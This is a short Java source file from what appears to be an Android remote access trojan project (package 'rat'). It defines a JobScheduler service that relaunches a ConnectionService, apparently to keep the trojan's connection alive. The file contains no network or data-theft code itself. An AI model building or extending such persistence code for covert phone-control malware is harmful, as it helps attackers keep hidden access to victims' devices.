package com.fly0rakoon.rat.services;



import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class JobSchedulerService extends JobService {
    private static final String TAG = "JobSchedulerService";

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(TAG, "Job started, launching ConnectionService");

        try {
            Intent serviceIntent = new Intent(this, ConnectionService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service from job", e);
        }

        return false; // Work is not continuing on a separate thread
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return false; // Don't reschedule if stopped
    }
}
